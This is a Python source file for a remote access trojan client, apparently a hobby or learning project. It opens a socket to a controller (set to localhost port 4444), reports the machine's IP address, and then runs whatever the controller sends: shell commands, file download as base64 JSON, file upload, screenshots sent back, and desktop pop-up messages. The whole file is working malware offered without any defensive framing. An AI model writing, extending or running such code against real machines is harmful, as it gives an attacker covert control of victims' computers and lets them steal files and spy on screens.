#!/usr/bin/env python3

import socket
import subprocess
import os
import base64
import json
import pyautogui
import time

class CLIENT:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        information_send = socket.gethostbyname(socket.gethostname())
        sock.send(information_send.encode())

    # def installdep(self):
    #     subprocess.run(['pip', 'install', 'pyautogui'])
        
    def main_loop(self):
        while True:
            
            command = sock.recv(1024).decode()

            if command == 'shell':
                while True:
                    command = sock.recv(1024).decode()
                    try:
                        if command == "exit":
                            break
                        elif command[:2] == 'cd':
                            os.chdir(command[3:])
                            directory = os.getcwd()
                            str_dir = str(directory)
                            sock.send(str_dir.encode())
                            command = ''
                        elif command[:3] == 'cat':
                            continue
                        elif command[:8] == 'download':
                            filename = command[9:]
                            file = open(filename, "rb")
                            bytes = file.read(600000)
                            base64_bytes = base64.b64encode(bytes)
                            file_json = {
                                "name": file.name,
                                "data": base64_bytes.decode()
                            }
                            file_send = json.dumps(file_json)
                            sock.send(file_send.encode())
                            command = ''
                            continue
                        output = subprocess.getoutput(command)
                        sock.send(output.encode())
                    except:
                        err = 'bad command'
                        sock.send(err.encode())

            if command == "upload":
                json_data = sock.recv(1024).decode()
                convert_json = json.loads(json_data)
                name = convert_json['name']
                bytes = convert_json['data']
                b64decoded_bytes = base64.b64decode(bytes)
                file_name = name.split('.')
                # open in binary
                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
                # #         # receive data and write it to file
                file.write(b64decoded_bytes)
                file.close()

            elif command == "screenshot":
                file = 'screenshot.png'
                pyautogui.screenshot(file)
                file = open(file, 'rb')
                file_data = file.read()
                sock.send(file_data)
                file.close()
                time.sleep(.2)
                subprocess.run(['rm', 'screenshot.png'])
                continue

            elif command == "sendmessage":
                message = sock.recv(1024).decode()
                print(message)
                subprocess.run(["/usr/bin/notify-send", "--icon=error", message])
                continue

rat = CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    # rat.installdep()
    rat.connection()
    rat.main_loop()
